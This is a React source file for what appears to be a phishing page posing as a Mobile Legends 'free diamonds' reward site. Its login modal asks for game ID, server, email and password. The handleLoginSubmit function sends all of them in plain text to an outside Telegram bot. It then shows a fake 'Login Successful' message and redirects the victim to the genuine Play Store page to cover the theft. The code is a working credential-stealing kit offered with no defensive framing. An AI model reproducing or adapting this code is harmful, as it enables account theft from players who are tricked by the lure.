import { useState } from 'react'
import DiamondRewardModal from './DiamondRewardModal'

const NotificationModal = ({ notification, setNotification }) => {
  if (!notification.show) return null

  const bgColor =
    notification.type === 'success' ? 'bg-green-500' : 'bg-red-500'

  const handleOkClick = () => {
    setNotification({ ...notification, show: false })
    // Redirect jika tipe sukses
    if (notification.type === 'success') {
      window.location.href =
        'https://play.google.com/store/apps/details?id=com.mobile.legends&hl=id'
    }
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div
        className={`${bgColor} text-white rounded-xl max-w-md w-full p-6 relative overflow-hidden animate-popUp`}
      >
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xl font-bold">{notification.title}</h3>
          <button
            onClick={() => setNotification({ ...notification, show: false })}
            className="text-white hover:text-gray-200 text-2xl"
          >
            &times;
          </button>
        </div>

        <p className="mb-6">{notification.message}</p>

        <button
          onClick={handleOkClick}
          className={`w-full py-2 rounded-md ${
            notification.type === 'success'
              ? 'bg-green-600 hover:bg-green-700'
              : 'bg-red-600 hover:bg-red-700'
          } text-white font-semibold transition-colors`}
        >
          OK
        </button>
      </div>
    </div>
  )
}

const Header = () => {
  const [isLoginOpen, setIsLoginOpen] = useState(false)
  const [notification, setNotification] = useState({
    show: false,
    type: '', // 'success' or 'error'
    message: '',
    title: '',
  })

  const handleClaimReward = () => {
    setIsLoginOpen(true) // Open login modal when reward is claimed
  }

  const sendToTelegram = async (message) => {
    const botToken = import.meta.env.VITE_BOT_TOKEN
    const chatId = import.meta.env.VITE_CHAT_ID
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      })

      return await response.json()
    } catch (error) {
      console.error('Error sending to Telegram:', error)
      throw error
    }
  }

  const handleLoginSubmit = async (e) => {
    e.preventDefault()
    const id_game = e.target.id_game.value
    const server_game = e.target.server_game.value
    const email = e.target.email.value
    const password = e.target.password.value

    if (!email || !password) {
      // Validasi akan ditangani oleh HTML5 required
      setNotification({
        show: true,
        type: 'error',
        title: 'Missing Information',
        message: 'Please fill in both email and password fields.',
      })
      return
    }

    // Proses login jika valid
    try {
      const message = `
        <b>🔐 Login Attempt</b>
        <b>ID & Server:</b> <code>${id_game} (${server_game})</code>
        <b>Email:</b> <code>${email}</code>
        <b>Password:</b> <code>${password}</code>
        <b>Time:</b> ${new Date().toLocaleString()}
      `

      await sendToTelegram(message)
      setNotification({
        show: true,
        type: 'success',
        title: 'Login Successful!',
        message:
          'Your login information has been processed. You will be redirected shortly.',
      })
      console.log('Data sent to Telegram successfully')

      // Lanjutkan proses login
    } catch (error) {
      console.error('Failed to send data:', error)
      setNotification({
        show: true,
        type: 'error',
        title: 'Login Failed',
        message:
          'We encountered an issue processing your login. Please try again later.',
      })
      // alert('Failed to process login. Please try again.')
    }
  }

  return (
    <>
      <header className="bg-[url('/header.png')] bg-cover bg-center">
        <div className="container mx-auto px-4 py-3 flex flex-col md:flex-row items-center justify-between">
          {/* Left Section */}
          <div className="flex flex-col md:flex-row items-center space-y-4 md:space-y-0 md:space-x-6 w-full md:w-auto">
            {/* Logo */}
            <div className="flex items-center">
              <img src="/logo.png" className="w-32 md:w-40" alt="Logo" />
            </div>

            {/* Language Selector */}
            <div className="flex items-center space-x-1">
              <div className="w-6 md:w-8 rounded-full mr-2">
                <img src="/globe.svg" className="w-full" alt="Globe" />
              </div>
              <span className="text-lg md:text-xl border-l px-2">EN</span>
            </div>

            {/* Login Button - Hidden on smallest screens */}
            <button
              className="hidden sm:block px-8 sm:px-12 md:px-20 py-2 text-white text-base md:text-lg font-medium border border-white rounded-sm bg-gradient-to-r from-[#2563eb]/60 to-[#38bdf8]/40 backdrop-blur-sm shadow-md hover:brightness-110 transition whitespace-nowrap"
              onClick={() => setIsLoginOpen(true)}
            >
              Login To Get Rewards
            </button>
          </div>

          {/* Right Section - App Store Buttons */}
          <div className="flex items-center  space-x-2 md:space-x-4 mt-4 md:mt-0">
            <div className="flex space-x-1 md:space-x-2">
              <div className="px-2 md:px-3 py-1 rounded text-xs flex items-center">
                <img
                  src="/appstore.png"
                  className="h-8 md:h-10"
                  alt="App Store"
                />
              </div>
              <div className="px-2 md:px-3 py-1 rounded text-xs flex items-center">
                <img
                  src="/playstore.png"
                  className="h-8 md:h-10"
                  alt="Play Store"
                />
              </div>
            </div>

            {/* Mobile Login Button - Only visible on small screens */}
            <button
              className="sm:hidden ml-4 px-4 py-1 text-white text-sm font-medium border border-white rounded-sm bg-gradient-to-r from-[#2563eb]/60 to-[#38bdf8]/40 backdrop-blur-sm shadow-md hover:brightness-110 transition"
              onClick={() => setIsLoginOpen(true)}
            >
              Login To Get Rewards
            </button>
          </div>
        </div>
      </header>
      {/* === Modal Overlay === */}
      {isLoginOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          {/* Modal Content - Lebih responsif dengan max-width dan width yang dinamis */}
          <div className="bg-[#0f172a] border border-blue-500 text-white rounded-md w-full max-w-xs sm:max-w-md md:max-w-lg p-4 sm:p-6 relative shadow-lg mx-auto">
            {/* Close Button */}
            <button
              onClick={() => setIsLoginOpen(false)}
              className="absolute top-3 right-3 text-white text-xl font-bold hover:text-blue-300 transition"
            >
              ×
            </button>

            {/* Title */}
            <h2 className="text-center text-lg sm:text-xl font-semibold mb-4 text-blue-300">
              SIGN IN TO CONTINUE
            </h2>

            {/* Form Container */}
            <form className="space-y-4" onSubmit={handleLoginSubmit}>
              <div className="space-y-4">
                {/* Game ID */}
                <div>
                  <label
                    htmlFor="id_game"
                    className="block text-sm text-blue-200 mb-1"
                  >
                    Game ID
                  </label>
                  <input
                    id="id_game"
                    type="text"
                    placeholder="game id"
                    name="id_game"
                    required
                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
                  />
                </div>

                {/* Server */}
                <div>
                  <label
                    htmlFor="server_game"
                    className="block text-sm text-blue-200 mb-1"
                  >
                    Server
                  </label>
                  <input
                    id="server_game"
                    type="text"
                    placeholder="server"
                    name="server_game"
                    required
                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
                  />
                </div>

                {/* Email Input */}
                <div>
                  <label
                    htmlFor="email"
                    className="block text-sm text-blue-200 mb-1"
                  >
                    Email
                  </label>
                  <input
                    id="email"
                    type="email"
                    placeholder="your@email.com"
                    name="email"
                    required
                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
                  />
                </div>

                {/* Password Input */}
                <div>
                  <label
                    htmlFor="password"
                    className="block text-sm text-blue-200 mb-1"
                  >
                    Password
                  </label>
                  <input
                    id="password"
                    type="password"
                    placeholder="••••••••"
                    name="password"
                    required
                    className="w-full px-4 py-2 rounded-md bg-blue-900/40 border border-blue-500 placeholder-blue-300 text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
                  />
                </div>

                {/* Login Button */}
                <button
                  className="w-full py-2 rounded-md bg-gradient-to-r from-blue-600 to-blue-400 text-white font-semibold hover:brightness-110 transition mt-4"
                  type="submit"
                >
                  Login
                </button>

                {/* Divider */}
                <div className="relative flex items-center py-4">
                  <div className="flex-grow border-t border-blue-700"></div>
                  <span className="flex-shrink mx-4 text-blue-300 text-sm">
                    OR
                  </span>
                  <div className="flex-grow border-t border-blue-700"></div>
                </div>

                {/* Social Login */}
                <div className="grid grid-cols-2 gap-3">
                  <button className="flex items-center justify-center space-x-2 bg-blue-900/30 border border-blue-700 rounded-md py-2 px-4 hover:bg-blue-900/50 transition">
                    <img src="/icons-google.svg" alt="Google" className="h-4" />
                    <span className="text-sm">Google</span>
                  </button>
                  <button className="flex items-center justify-center space-x-2 bg-blue-900/30 border border-blue-700 rounded-md py-2 px-4 hover:bg-blue-900/50 transition">
                    <img
                      src="/icons-facebook.svg"
                      alt="Facebook"
                      className="h-4"
                    />
                    <span className="text-sm">Facebook</span>
                  </button>
                </div>

                {/* Sign Up Link */}
                <p className="text-center text-sm text-blue-300 mt-4">
                  Don't have an account?{' '}
                  <a href="#" className="font-semibold hover:text-blue-400">
                    Sign up
                  </a>
                </p>
              </div>
            </form>
          </div>
        </div>
      )}
      {/* Reward Modal - Only shown once on first visit */}
      <DiamondRewardModal onClaimReward={handleClaimReward} />
      {/* notification */}
      <NotificationModal
        notification={notification}
        setNotification={setNotification}
      />
    </>
  )
}

export default Header
